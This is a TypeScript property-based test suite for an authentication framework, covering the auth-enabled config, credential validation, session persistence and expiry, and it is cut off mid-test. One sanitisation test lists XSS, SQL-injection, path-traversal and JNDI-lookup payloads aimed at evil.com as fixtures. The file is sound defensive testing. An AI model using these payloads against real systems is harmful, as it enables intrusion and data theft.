import * as fc from 'fast-check';
import { ConfigManager } from '../config';
import { validateLoginCredentials, validateUser, validateSession, sanitizeInput } from '../validation';
import { generateSessionToken, isSessionExpired, createSessionExpiration, safeParseJSON, safeStringifyJSON } from '../utils';

/**
 * Property-based tests for authentication interfaces
 * Feature: configurable-auth-framework, Property 1: Environment-based authentication control
 * Validates: Requirements 1.1, 1.2, 3.1, 3.2
 */

describe('Authentication Properties', () => {
  beforeEach(() => {
    // Reset config before each test
    ConfigManager.resetConfig();
    
    // Clear environment variables
    delete process.env.AUTH_ENABLED;
    delete process.env.NEXT_PUBLIC_AUTH_ENABLED;
  });

  afterEach(() => {
    // Clean up after each test
    ConfigManager.resetConfig();
  });

  /**
   * Property 1: Environment-based authentication control
   * For any route and any AUTH_ENABLED configuration value, 
   * when AUTH_ENABLED is "true" the system should require authentication for protected routes,
   * and when AUTH_ENABLED is "false" the system should allow direct access to all routes
   */
  describe('Property 1: Environment-based authentication control', () => {
    it('should consistently handle auth requirements based on AUTH_ENABLED configuration', () => {
      fc.assert(
        fc.property(
          // Generate random AUTH_ENABLED values (true/false as strings)
          fc.oneof(
            fc.constant('true'),
            fc.constant('false'),
            fc.constant('TRUE'),
            fc.constant('FALSE'),
            fc.constant(undefined) // Test default behavior
          ),
          // Generate random route paths
          fc.string({ minLength: 1, maxLength: 50 }).map(s => `/${s.replace(/[^a-zA-Z0-9-_]/g, '')}`),
          (authEnabledValue, routePath) => {
            // Set up environment
            if (authEnabledValue !== undefined) {
              process.env.AUTH_ENABLED = authEnabledValue;
            } else {
              // Explicitly delete the environment variable
              delete process.env.AUTH_ENABLED;
              delete process.env.NEXT_PUBLIC_AUTH_ENABLED;
            }
            
            // Reset config to pick up new environment
            ConfigManager.resetConfig();
            
            const config = ConfigManager.getAuthConfig();
            const isAuthEnabled = ConfigManager.isAuthEnabled();
            
            // Property assertions
            if (authEnabledValue === undefined) {
              // Default behavior: should require authentication
              expect(config.authEnabled).toBe(true);
              expect(isAuthEnabled).toBe(true);
            } else if (authEnabledValue.toLowerCase() === 'false') {
              // Explicitly disabled: should not require authentication
              expect(config.authEnabled).toBe(false);
              expect(isAuthEnabled).toBe(false);
            } else {
              // Any other value (including "true"): should require authentication (secure default)
              expect(config.authEnabled).toBe(true);
              expect(isAuthEnabled).toBe(true);
            }
            
            // Consistency check: both methods should return the same value
            expect(config.authEnabled).toBe(isAuthEnabled);
            
            // Route-independent behavior: auth setting should be consistent regardless of route
            const config2 = ConfigManager.getAuthConfig();
            expect(config.authEnabled).toBe(config2.authEnabled);
          }
        ),
        { numRuns: 100 } // Run 100 iterations as specified in design
      );
    });

    it('should handle edge cases in environment configuration', () => {
      fc.assert(
        fc.property(
          // Generate various edge case values
          fc.oneof(
            fc.constant(''),           // Empty string
            fc.constant('   '),        // Whitespace
            fc.constant('yes'),        // Non-boolean string
            fc.constant('no'),         // Non-boolean string
            fc.constant('1'),          // Numeric string
            fc.constant('0'),          // Numeric string
            fc.constant('True'),       // Mixed case
            fc.constant('False'),      // Mixed case
          ),
          (edgeCaseValue) => {
            process.env.AUTH_ENABLED = edgeCaseValue;
            ConfigManager.resetConfig();
            
            const config = ConfigManager.getAuthConfig();
            
            // For any value, only "false" (case insensitive) should disable auth
            // All other values should result in secure default (true)
            if (edgeCaseValue.toLowerCase() === 'false') {
              expect(config.authEnabled).toBe(false);
            } else {
              // All non-"false" values should default to secure (true)
              expect(config.authEnabled).toBe(true);
            }
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should maintain configuration consistency across multiple calls', () => {
      fc.assert(
        fc.property(
          fc.boolean(),
          (authEnabled) => {
            process.env.AUTH_ENABLED = authEnabled.toString();
            ConfigManager.resetConfig();
            
            // Multiple calls should return the same configuration
            const config1 = ConfigManager.getAuthConfig();
            const config2 = ConfigManager.getAuthConfig();
            const config3 = ConfigManager.getAuthConfig();
            
            expect(config1).toBe(config2); // Same object reference (cached)
            expect(config2).toBe(config3); // Same object reference (cached)
            expect(config1.authEnabled).toBe(config2.authEnabled);
            expect(config2.authEnabled).toBe(config3.authEnabled);
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  /**
   * Additional property tests for configuration robustness
   */
  describe('Configuration robustness properties', () => {
    it('should handle concurrent configuration access safely', () => {
      fc.assert(
        fc.property(
          fc.array(fc.boolean(), { minLength: 1, maxLength: 10 }),
          (authValues) => {
            // Simulate concurrent access with different auth values
            const results = authValues.map(authEnabled => {
              process.env.AUTH_ENABLED = authEnabled.toString();
              ConfigManager.resetConfig();
              return ConfigManager.isAuthEnabled();
            });
            
            // Each result should match its corresponding input
            results.forEach((result, index) => {
              expect(result).toBe(authValues[index]);
            });
          }
        ),
        { numRuns: 30 }
      );
    });

    it('should provide type-safe configuration access', () => {
      fc.assert(
        fc.property(
          fc.record({
            authEnabled: fc.boolean(),
            sessionTimeout: fc.integer({ min: 1000, max: 86400000 }), // 1 second to 24 hours
          }),
          (configValues) => {
            process.env.AUTH_ENABLED = configValues.authEnabled.toString();
            process.env.SESSION_TIMEOUT = configValues.sessionTimeout.toString();
            ConfigManager.resetConfig();
            
            const config = ConfigManager.getAuthConfig();
            
            // Type safety checks
            expect(typeof config.authEnabled).toBe('boolean');
            expect(typeof config.sessionTimeout).toBe('number');
            expect(typeof config.rememberSidebar).toBe('boolean');
            
            // Value correctness
            expect(config.authEnabled).toBe(configValues.authEnabled);
            expect(config.sessionTimeout).toBe(configValues.sessionTimeout);
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  /**
   * Property 2: Authentication flow consistency
   * For any valid credentials, successful authentication should result in 
   * authenticated state and redirect to intended destination
   */
  describe('Property 2: Authentication flow consistency', () => {
    it('should consistently handle authentication flow for valid credentials', () => {
      fc.assert(
        fc.property(
          // Generate valid credentials
          fc.record({
            username: fc.string({ minLength: 3, maxLength: 20 }).filter(s => s.trim().length >= 3),
            password: fc.string({ minLength: 6, maxLength: 50 }),
          }),
          // Generate intended destinations
          fc.string({ minLength: 1, maxLength: 50 }).map(s => `/${s.replace(/[^a-zA-Z0-9-_]/g, '')}`),
          (credentials, intendedDestination) => {
            // Mock successful authentication result
            const mockAuthResult = {
              success: true,
              user: {
                id: fc.sample(fc.string({ minLength: 1, maxLength: 10 }), 1)[0],
                username: credentials.username,
                email: `${credentials.username}@example.com`,
                roles: ['user'],
                lastLogin: new Date(),
              },
            };

            // Property assertions for authentication flow consistency
            expect(mockAuthResult.success).toBe(true);
            expect(mockAuthResult.user).toBeDefined();
            expect(mockAuthResult.user!.username).toBe(credentials.username);
            expect(mockAuthResult.user!.email).toContain(credentials.username);
            expect(Array.isArray(mockAuthResult.user!.roles)).toBe(true);
            expect(mockAuthResult.user!.lastLogin).toBeInstanceOf(Date);
            
            // Consistency check: user data should be valid
            const validation = validateLoginCredentials(credentials);
            expect(validation.isValid).toBe(true);
            
            // User object should be valid
            expect(validateUser(mockAuthResult.user!)).toBe(true);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle authentication state transitions consistently', () => {
      fc.assert(
        fc.property(
          fc.array(
            fc.record({
              username: fc.oneof(
                fc.constant('admin'),
                fc.constant('user'),
                fc.string({ minLength: 3, maxLength: 20 })
              ),
              password: fc.oneof(
                fc.constant('password'),
                fc.string({ minLength: 6, maxLength: 50 })
              ),
            }),
            { minLength: 1, maxLength: 5 }
          ),
          (credentialsList) => {
            // Test multiple authentication attempts
            credentialsList.forEach(credentials => {
              const validation = validateLoginCredentials(credentials);
              
              // Valid credentials should always pass validation
              if (credentials.username.trim().length >= 3 && credentials.password.length >= 6) {
                expect(validation.isValid).toBe(true);
                expect(validation.errors).toHaveLength(0);
              } else {
                expect(validation.isValid).toBe(false);
                expect(validation.errors.length).toBeGreaterThan(0);
              }
            });
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should maintain authentication flow invariants', () => {
      fc.assert(
        fc.property(
          fc.record({
            username: fc.string({ minLength: 3, maxLength: 20 }),
            password: fc.string({ minLength: 6, maxLength: 50 }),
          }),
          (credentials) => {
            // Authentication flow invariants
            const validation = validateLoginCredentials(credentials);
            
            // Invariant 1: Valid credentials always pass validation
            if (validation.isValid) {
              expect(credentials.username.trim().length).toBeGreaterThanOrEqual(3);
              expect(credentials.password.length).toBeGreaterThanOrEqual(6);
            }
            
            // Invariant 2: Validation is deterministic
            const validation2 = validateLoginCredentials(credentials);
            expect(validation.isValid).toBe(validation2.isValid);
            expect(validation.errors).toEqual(validation2.errors);
            
            // Invariant 3: Sanitized input should be safe
            const sanitizedUsername = sanitizeInput(credentials.username);
            expect(sanitizedUsername).not.toContain('<');
            expect(sanitizedUsername).not.toContain('>');
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  /**
   * Property 3: Invalid credentials handling
   * For any invalid credentials, the system should consistently reject authentication
   * and provide appropriate error messages without revealing sensitive information
   */
  describe('Property 3: Invalid credentials handling', () => {
    it('should consistently reject invalid credentials', () => {
      fc.assert(
        fc.property(
          // Generate invalid credentials
          fc.oneof(
            // Empty username
            fc.record({
              username: fc.constant(''),
              password: fc.string({ minLength: 6, maxLength: 50 }),
            }),
            // Short username
            fc.record({
              username: fc.string({ minLength: 1, maxLength: 2 }),
              password: fc.string({ minLength: 6, maxLength: 50 }),
            }),
            // Empty password
            fc.record({
              username: fc.string({ minLength: 3, maxLength: 20 }),
              password: fc.constant(''),
            }),
            // Short password
            fc.record({
              username: fc.string({ minLength: 3, maxLength: 20 }),
              password: fc.string({ minLength: 1, maxLength: 5 }),
            }),
            // Both invalid
            fc.record({
              username: fc.oneof(fc.constant(''), fc.string({ minLength: 1, maxLength: 2 })),
              password: fc.oneof(fc.constant(''), fc.string({ minLength: 1, maxLength: 5 })),
            }),
            // Whitespace only username
            fc.record({
              username: fc.string({ minLength: 1, maxLength: 10 }).map(s => ' '.repeat(s.length)),
              password: fc.string({ minLength: 6, maxLength: 50 }),
            }),
          ),
          (invalidCredentials) => {
            // Property assertions for invalid credentials handling
            const validation = validateLoginCredentials(invalidCredentials);
            
            // Invalid credentials should always fail validation
            expect(validation.isValid).toBe(false);
            expect(validation.errors.length).toBeGreaterThan(0);
            
            // Error messages should be informative and secure
            validation.errors.forEach(error => {
              expect(typeof error).toBe('string');
              expect(error.length).toBeGreaterThan(0);
              // Error messages should not be empty or just whitespace
              expect(error.trim().length).toBeGreaterThan(0);
            });
            
            // Validation should be deterministic
            const validation2 = validateLoginCredentials(invalidCredentials);
            expect(validation.isValid).toBe(validation2.isValid);
            expect(validation.errors).toEqual(validation2.errors);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle malicious input safely', () => {
      fc.assert(
        fc.property(
          // Generate potentially malicious credentials
          fc.record({
            username: fc.oneof(
              fc.constant('<script>alert("xss")</script>'),
              fc.constant('admin\'; DROP TABLE users; --'),
              fc.constant('../../etc/passwd'),
              fc.constant('${jndi:ldap://evil.com/a}'),
              fc.constant('<img src=x onerror=alert(1)>'),
              fc.string({ minLength: 1, maxLength: 100 }).map(s => s + '<script>'),
            ),
            password: fc.oneof(
              fc.constant('<script>alert("xss")</script>'),
              fc.constant('password\'; DROP TABLE sessions; --'),
              fc.constant('../../../etc/shadow'),
              fc.constant('${jndi:ldap://evil.com/b}'),
              fc.constant('<img src=x onerror=alert(2)>'),
              fc.string({ minLength: 1, maxLength: 100 }).map(s => s + '</script>'),
            ),
          }),
          (maliciousCredentials) => {
            // Property assertions for malicious input handling
            const validation = validateLoginCredentials(maliciousCredentials);
            
            // Malicious input should be handled safely
            expect(() => validateLoginCredentials(maliciousCredentials)).not.toThrow();
            
            // Sanitized input should be safe
            const sanitizedUsername = sanitizeInput(maliciousCredentials.username);
            const sanitizedPassword = sanitizeInput(maliciousCredentials.password);
            
            expect(sanitizedUsername).not.toContain('<script>');
            expect(sanitizedUsername).not.toContain('</script>');
            expect(sanitizedUsername).not.toContain('<img');
            expect(sanitizedPassword).not.toContain('<script>');
            expect(sanitizedPassword).not.toContain('</script>');
            expect(sanitizedPassword).not.toContain('<img');
            
            // Validation should still work on sanitized input
            const sanitizedCredentials = {
              username: sanitizedUsername,
              password: sanitizedPassword,
            };
            expect(() => validateLoginCredentials(sanitizedCredentials)).not.toThrow();
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should provide consistent error messages for similar invalid inputs', () => {
      fc.assert(
        fc.property(
          // Generate similar invalid credential patterns
          fc.array(
            fc.record({
              username: fc.oneof(
                fc.constant(''),
                fc.constant('ab'), // Too short
                fc.constant('  '), // Whitespace only
              ),
              password: fc.string({ minLength: 6, maxLength: 20 }),
            }),
            { minLength: 2, maxLength: 5 }
          ),
          (similarInvalidCredentials) => {
            const validations = similarInvalidCredentials.map(creds => 
              validateLoginCredentials(creds)
            );
            
            // All should be invalid
            validations.forEach(validation => {
              expect(validation.isValid).toBe(false);
              expect(validation.errors.length).toBeGreaterThan(0);
            });
            
            // Similar patterns should produce similar error types
            const errorTypes = validations.map(v => v.errors.sort());
            
            // For empty/short usernames, should get consistent username-related errors
            const usernameErrors = errorTypes.filter(errors => 
              errors.some(error => error.toLowerCase().includes('username'))
            );
            
            if (usernameErrors.length > 1) {
              // Should have consistent username error messages
              const firstUsernameError = usernameErrors[0].find(e => e.toLowerCase().includes('username'));
              usernameErrors.forEach(errors => {
                const usernameError = errors.find(e => e.toLowerCase().includes('username'));
                expect(usernameError).toBeDefined();
              });
            }
          }
        ),
        { numRuns: 30 }
      );
    });

    it('should handle edge cases in credential validation', () => {
      fc.assert(
        fc.property(
          // Generate edge case credentials
          fc.oneof(
            // Unicode characters
            fc.record({
              username: fc.constant('用户名'),
              password: fc.constant('密码123456'),
            }),
            // Very long inputs
            fc.record({
              username: fc.string({ minLength: 100, maxLength: 1000 }),
              password: fc.string({ minLength: 100, maxLength: 1000 }),
            }),
            // Special characters
            fc.record({
              username: fc.constant('user@domain.com'),
              password: fc.constant('P@ssw0rd!'),
            }),
            // Mixed case
            fc.record({
              username: fc.constant('UsErNaMe'),
              password: fc.constant('PaSsWoRd123'),
            }),
          ),
          (edgeCaseCredentials) => {
            // Property assertions for edge case handling
            expect(() => validateLoginCredentials(edgeCaseCredentials)).not.toThrow();
            
            const validation = validateLoginCredentials(edgeCaseCredentials);
            
            // Validation result should be consistent with credential quality
            if (edgeCaseCredentials.username.trim().length >= 3 && 
                edgeCaseCredentials.password.length >= 6) {
              expect(validation.isValid).toBe(true);
              expect(validation.errors).toHaveLength(0);
            } else {
              expect(validation.isValid).toBe(false);
              expect(validation.errors.length).toBeGreaterThan(0);
            }
            
            // Should handle unicode and special characters gracefully
            expect(validation.errors).toEqual(expect.any(Array));
            validation.errors.forEach(error => {
              expect(typeof error).toBe('string');
              expect(error.length).toBeGreaterThan(0);
            });
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  /**
   * Property 5: Authentication state persistence
   * For any authentication state, the system should persist authentication data
   * across browser sessions and restore it correctly on application restart
   */
  describe('Property 5: Authentication state persistence', () => {
    // Mock localStorage for testing
    const mockLocalStorage = (() => {
      let store: Record<string, string> = {};
      return {
        getItem: (key: string) => {
          const value = store[key];
          return value !== undefined ? value : null;
        },
        setItem: (key: string, value: string) => { 
          store[key] = value;
        },
        removeItem: (key: string) => { delete store[key]; },
        clear: () => { store = {}; },
      };
    })();

    beforeEach(() => {
      // Mock localStorage
      Object.defineProperty(window, 'localStorage', {
        value: mockLocalStorage,
        writable: true,
      });
      mockLocalStorage.clear();
    });

    it('should persist and restore authentication state correctly', () => {
      fc.assert(
        fc.property(
          // Generate user data
          fc.record({
            id: fc.string({ minLength: 1, maxLength: 20 }),
            username: fc.string({ minLength: 3, maxLength: 20 }),
            email: fc.emailAddress(),
            roles: fc.array(fc.string({ minLength: 1, maxLength: 10 }), { minLength: 1, maxLength: 5 }),
          }),
          // Generate session timeout
          fc.integer({ min: 60000, max: 86400000 }),
          (userData, sessionTimeout) => {
            // Create authentication state
            const token = generateSessionToken();
            const expiresAt = createSessionExpiration(sessionTimeout);
            const createdAt = new Date();
            const lastLogin = new Date();

            const user = {
              ...userData,
              lastLogin,
            };

            const session = {
              token,
              userId: userData.id,
              expiresAt,
              createdAt,
            };

            // Simulate saving to localStorage (as AuthProvider would do)
            const sessionData = safeStringifyJSON(session);
            const userDataStr = safeStringifyJSON(user);
            
            mockLocalStorage.setItem('session_data', sessionData);
            mockLocalStorage.setItem('user_data', userDataStr);
            mockLocalStorage.setItem('auth_token', token);

            // Property assertions for persistence
            expect(mockLocalStorage.getItem('session_data')).toBe(sessionData);
            expect(mockLocalStorage.getItem('user_data')).toBe(userDataStr);
            expect(mockLocalStorage.getItem('auth_token')).toBe(token);

            // Simulate restoration (as AuthProvider would do on app restart)
            const restoredSessionData = mockLocalStorage.getItem('session_data');
            const restoredUserData = mockLocalStorage.getItem('user_data');
            const restoredToken = mockLocalStorage.getItem('auth_token');

            expect(restoredSessionData).toBeTruthy();
            expect(restoredUserData).toBeTruthy();
            expect(restoredToken).toBeTruthy();

            // Parse restored data
            const restoredSession = safeParseJSON(restoredSessionData, null);
            const restoredUser = safeParseJSON(restoredUserData, null);

            // Validate restored data
            expect(restoredSession).toBeTruthy();
            expect(restoredUser).toBeTruthy();
            if (restoredSession && restoredUser) {
              expect(validateSession(restoredSession)).toBe(true);
              expect(validateUser(restoredUser)).toBe(true);

              // Data integrity checks
              expect((restoredSession as any).token).toBe(token);
              expect((restoredSession as any).userId).toBe(userData.id);
              expect((restoredUser as any).id).toBe(userData.id);
              expect((restoredUser as any).username).toBe(userData.username);
              expect((restoredUser as any).email).toBe(userData.email);
              expect((restoredUser as any).roles).toEqual(userData.roles);

              // Session should not be expired immediately after creation
              const restoredExpiresAt = new Date((restoredSession as any).expiresAt);
              expect(isSessionExpired(restoredExpiresAt)).toBe(false);
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle corrupted persistence data gracefully', () => {
      fc.assert(
        fc.property(
          // Generate corrupted data scenarios
          fc.oneof(
            fc.constant('invalid json'),
            fc.constant('{"incomplete": true'),
            fc.constant('null'),
            fc.constant('undefined'),
            fc.constant(''),
            fc.constant('{}'),
            fc.constant('{"token": ""}'), // Empty token
            fc.constant('{"userId": ""}'), // Empty userId
          ),
          (corruptedData) => {
            // Set corrupted data in localStorage
            mockLocalStorage.setItem('session_data', corruptedData);
            mockLocalStorage.setItem('user_data', corruptedData);

            // Attempt to restore data
            const restoredSessionData = mockLocalStorage.getItem('session_data');
            const restoredUserData = mockLocalStorage.getItem('user_data');

            expect(restoredSessionData).toBe(corruptedData);
            expect(restoredUserData).toBe(corruptedData);

            // Parse should handle corruption gracefully
            const restoredSession = safeParseJSON(restoredSessionData, null);
            const restoredUser = safeParseJSON(restoredUserData, null);

            // Validation should reject corrupted data
            if (restoredSession) {
              expect(validateSession(restoredSession)).toBe(false);
            }
            if (restoredUser) {
              expect(validateUser(restoredUser)).toBe(false);
            }

            // System should handle gracefully without throwing
            expect(() => safeParseJSON(corruptedData, null)).not.toThrow();
            expect(() => validateSession(restoredSession)).not.toThrow();
            expect(() => validateUser(restoredUser)).not.toThrow();
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should maintain persistence consistency across multiple operations', () => {
      fc.assert(
        fc.property(
          fc.array(
            fc.record({
              id: fc.string({ minLength: 1, maxLength: 10 }),
              username: fc.string({ minLength: 3, maxLength: 15 }),
              email: fc.emailAddress(),
            }),
            { minLength: 1, maxLength: 5 }
          ),
          (userDataList) => {
            userDataList.forEach((userData, index) => {
              const token = generateSessionToken();
              const expiresAt = createSessionExpiration(3600000); // 1 hour
              const createdAt = new Date();

              const user = {
                ...userData,
                roles: ['user'],
                lastLogin: new Date(),
              };

              const session = {
                token,
                userId: userData.id,
                expiresAt,
                createdAt,
              };

              // Save to localStorage
              mockLocalStorage.setItem('session_data', safeStringifyJSON(session));
              mockLocalStorage.setItem('user_data', safeStringifyJSON(user));
              mockLocalStorage.setItem('auth_token', token);

              // Immediately restore and verify
              const restored = {
                session: safeParseJSON(mockLocalStorage.getItem('session_data'), null),
                user: safeParseJSON(mockLocalStorage.getItem('user_data'), null),
                token: mockLocalStorage.getItem('auth_token'),
              };

              // Consistency checks
              expect(restored.session).toBeTruthy();
              expect(restored.user).toBeTruthy();
              expect(restored.token).toBe(token);
              if (restored.session && restored.user) {
                expect((restored.session as any).token).toBe(token);
                expect((restored.session as any).userId).toBe(userData.id);
                expect((restored.user as any).id).toBe(userData.id);
                expect((restored.user as any).username).toBe(userData.username);
              }

              // Validation should pass
              expect(validateSession(restored.session)).toBe(true);
              expect(validateUser(restored.user)).toBe(true);
            });
          }
        ),
        { numRuns: 30 }
      );
    });

    it('should handle session expiration in persisted data', () => {
      fc.assert(
        fc.property(
          fc.record({
            id: fc.string({ minLength: 1, maxLength: 10 }),
            username: fc.string({ minLength: 3, maxLength: 15 }),
            timeOffset: fc.integer({ min: -86400000, max: 86400000 }), // -24h to +24h
          }),
          (testData) => {
            const token = generateSessionToken();
            const now = new Date();
            const expiresAt = new Date(now.getTime() + testData.timeOffset);
            const createdAt = new Date(now.getTime() - Math.abs(testData.timeOffset));

            const user = {
              id: testData.id,
              username: testData.username,
              email: `${testData.username}@example.com`,
              roles: ['user'],
              lastLogin: new Date(),
            };

            const session = {
              token,
              userId: testData.id,
              expiresAt,
              createdAt,
            };

            // Persist data
            mockLocalStorage.setItem('session_data', safeStringifyJSON(session));
            mockLocalStorage.setItem('user_data', safeStringifyJSON(user));

            // Restore data
            const restoredSession = safeParseJSON(mockLocalStorage.getItem('session_data'), null);
            const restoredUser = safeParseJSON(mockLocalStorage.getItem('user_data'), null);

            // Data should be restored correctly
            expect(restoredSession).toBeTruthy();
            expect(restoredUser).toBeTruthy();
            if (restoredSession && restoredUser) {
              expect(validateSession(restoredSession)).toBe(true);
              expect(validateUser(restoredUser)).toBe(true);

              // Check expiration status
              const restoredExpiresAt = new Date((restoredSession as any).expiresAt);
              const shouldBeExpired = testData.timeOffset < 0;
              const actuallyExpired = isSessionExpired(restoredExpiresAt);
              
              // For small timeOffset values (within 1 second), allow timing differences
              if (Math.abs(testData.timeOffset) <= 1000) {
                // Session created at current time might be expired due to timing
                // This is acceptable behavior for small time differences
              } else {
                expect(actuallyExpired).toBe(shouldBeExpired);
              }

              // Persistence should work regardless of expiration status
              expect((restoredSession as any).token).toBe(token);
              expect((restoredSession as any).userId).toBe(testData.id);
              expect((restoredUser as any).username).toBe(testData.username);
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  /**
   * Property 4: Session management lifecycle
   * For any authentication session, the system should create secure sessions on login,
   * persist them across browser sessions until expiration, and immediately invalidate them on logout
   */
  describe('Property 4: Session management lifecycle', () => {
    it('should create valid sessions for any successful authentication', () => {
      fc.assert(
        fc.property(
          // Generate user data
          fc.record({
            id: fc.string({ minLength: 1, maxLength: 20 }),
            username: fc.string({ minLength: 3, maxLength: 20 }),
            email: fc.emailAddress(),
            roles: fc.array(fc.string({ minLength: 1, maxLength: 10 }), { minLength: 1, maxLength: 5 }),
          }),
          // Generate session timeout values
          fc.integer({ min: 60000, max: 86400000 }), // 1 minute to 24 hours
          (userData, sessionTimeout) => {
            // Create session
            const token = generateSessionToken();
            const expiresAt = createSessionExpiration(sessionTimeout);
            const createdAt = new Date();
            
            const session = {
              token,
              userId: userData.id,
              expiresAt,
              createdAt,
            };
            
            const user = {
              ...userData,
              lastLogin: new Date(),
            };
            
            // Property assertions for session creation
            expect(typeof session.token).toBe('string');
            expect(session.token.length).toBeGreaterThan(0);
            expect(session.userId).toBe(userData.id);
            expect(session.expiresAt).toBeInstanceOf(Date);
            expect(session.createdAt).toBeInstanceOf(Date);
            expect(session.expiresAt.getTime()).toBeGreaterThan(session.createdAt.getTime());
            
            // Session should be valid
            expect(validateSession(session)).toBe(true);
            expect(validateUser(user)).toBe(true);
            
            // Session should not be expired immediately after creation
            expect(isSessionExpired(session.expiresAt)).toBe(false);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle session expiration correctly', () => {
      fc.assert(
        fc.property(
          // Generate session data with various expiration times
          fc.record({
            token: fc.string({ minLength: 10, maxLength: 50 }),
            userId: fc.string({ minLength: 1, maxLength: 20 }),
            timeOffset: fc.integer({ min: -86400000, max: 86400000 }), // -24h to +24h
          }),
          (sessionData) => {
            const now = new Date();
            const expiresAt = new Date(now.getTime() + sessionData.timeOffset);
            const createdAt = new Date(now.getTime() - Math.abs(sessionData.timeOffset));
            
            const session = {
              token: sessionData.token,
              userId: sessionData.userId,
              expiresAt,
              createdAt,
            };
            
            // Property assertions for session expiration
            const isExpired = isSessionExpired(expiresAt);
            
            if (sessionData.timeOffset < 0) {
              // Past expiration time should be expired
              expect(isExpired).toBe(true);
            } else {
              // Future expiration time should not be expired
              expect(isExpired).toBe(false);
            }
            
            // Session validation should work regardless of expiration
            expect(validateSession(session)).toBe(true);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should maintain session data integrity', () => {
      fc.assert(
        fc.property(
          fc.array(
            fc.record({
              token: fc.string({ minLength: 10, maxLength: 50 }),
              userId: fc.string({ minLength: 1, maxLength: 20 }),
              sessionTimeout: fc.integer({ min: 60000, max: 86400000 }),
            }),
            { minLength: 1, maxLength: 10 }
          ),
          (sessionDataList) => {
            sessionDataList.forEach(sessionData => {
              const token = generateSessionToken();
              const expiresAt = createSessionExpiration(sessionData.sessionTimeout);
              const createdAt = new Date();
              
              const session = {
                token,
                userId: sessionData.userId,
                expiresAt,
                createdAt,
              };
              
              // Invariant 1: Token should be unique and non-empty
              expect(session.token).toBeTruthy();
              expect(typeof session.token).toBe('string');
              
              // Invariant 2: Expiration should be in the future
              expect(session.expiresAt.getTime()).toBeGreaterThan(session.createdAt.getTime());
              
              // Invariant 3: Session should be serializable
              const serialized = JSON.stringify(session);
              const deserialized = JSON.parse(serialized);
              expect(deserialized.token).toBe(session.token);
              expect(deserialized.userId).toBe(session.userId);
              
              // Invariant 4: Session validation should be consistent
              expect(validateSession(session)).toBe(true);
            });
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should handle session lifecycle transitions', () => {
      fc.assert(
        fc.property(
          fc.record({
            userId: fc.string({ minLength: 1, maxLength: 20 }),
            sessionTimeout: fc.integer({ min: 60000, max: 3600000 }),
          }),
          (sessionConfig) => {
            // Create session (login)
            const token = generateSessionToken();
            const expiresAt = createSessionExpiration(sessionConfig.sessionTimeout);
            const createdAt = new Date();
            
            const session = {
              token,
              userId: sessionConfig.userId,
              expiresAt,
              createdAt,
            };
            
            // Session should be valid after creation
            expect(validateSession(session)).toBe(true);
            expect(isSessionExpired(session.expiresAt)).toBe(false);
            
            // Session should maintain consistency across operations
            const sessionCopy = { ...session };
            expect(validateSession(sessionCopy)).toBe(true);
            expect(sessionCopy.token).toBe(session.token);
            expect(sessionCopy.userId).toBe(session.userId);
            
            // Logout simulation (session invalidation)
            const invalidatedSession = { ...session, token: '' };
            expect(validateSession(invalidatedSession)).toBe(false);
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  /**
   * Property 6: Session expiration handling
   * For any session with an expiration time, the system should automatically
   * invalidate expired sessions and require re-authentication
   */
  describe('Property 6: Session expiration handling', () => {
    it('should handle session expiration correctly across different time scenarios', () => {
      fc.assert(
        fc.property(
          // Generate session data with various expiration scenarios
          fc.record({
            userId: fc.string({ minLength: 1, maxLength: 20 }),
            sessionTimeout: fc.integer({ min: 1000, max: 86400000 }), // 1 second to 24 hours
            timeWarpMs: fc.integer({ min: -86400000, max: 86400000 }), // Time travel for testing
          }),
          (sessionData) => {
            const baseTime = new Date();
            const token = generateSessionToken();
            
            // Create session with specific expiration
            const expiresAt = new Date(baseTime.getTime() + sessionData.sessionTimeout);
            const createdAt = new Date(baseTime.getTime() - 1000); // Created 1 second ago
            
            const session = {
              token,
              userId: sessionData.userId,
              expiresAt,
              createdAt,
            };

            // Property assertions for session expiration
            expect(validateSession(session)).toBe(true);
            
            // Test expiration logic with time manipulation
            const futureTime = new Date(expiresAt.getTime() + sessionData.timeWarpMs);
            const shouldBeExpired = sessionData.timeWarpMs > 0;
            
            // Create a custom expiration check with the future time
            const isExpiredAtTime = (expTime: Date, checkTime: Date) => checkTime > expTime;
            const isExpired = isExpiredAtTime(expiresAt, futureTime);
            
            expect(isExpired).toBe(shouldBeExpired);
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle edge cases in session expiration', () => {
      fc.assert(
        fc.property(
          // Generate edge case scenarios
          fc.oneof(
            // Very short sessions (1 second)
            fc.record({
              timeout: fc.constant(1000),
              scenario: fc.constant('short'),
            }),
            // Very long sessions (24 hours)
            fc.record({
              timeout: fc.constant(86400000),
              scenario: fc.constant('long'),
            }),
            // Exactly at expiration time
            fc.record({
              timeout: fc.integer({ min: 60000, max: 3600000 }),
              scenario: fc.constant('exact'),
            }),
          ),
          (edgeCase) => {
            const now = new Date();
            const token = generateSessionToken();
            const expiresAt = createSessionExpiration(edgeCase.timeout);
            const createdAt = new Date(now.getTime() - 1000);

            const session = {
              token,
              userId: 'test-user',
              expiresAt,
              createdAt,
            };

            // Session should be valid when created
            expect(validateSession(session)).toBe(true);
            expect(isSessionExpired(expiresAt)).toBe(false);

            // Test different expiration scenarios
            if (edgeCase.scenario === 'short') {
              // Short sessions should expire quickly (allow small timing tolerance)
              expect(expiresAt.getTime() - now.getTime()).toBeLessThanOrEqual(1010); // Allow 10ms tolerance
            } else if (edgeCase.scenario === 'long') {
              // Long sessions should not expire soon
              expect(expiresAt.getTime() - now.getTime()).toBeGreaterThan(86000000);
            } else if (edgeCase.scenario === 'exact') {
              // Test exactly at expiration time - create a time 1ms after expiration
              const expiredTime = new Date(expiresAt.getTime() + 1);
              const isExpiredAtTime = (expTime: Date, checkTime: Date) => checkTime > expTime;
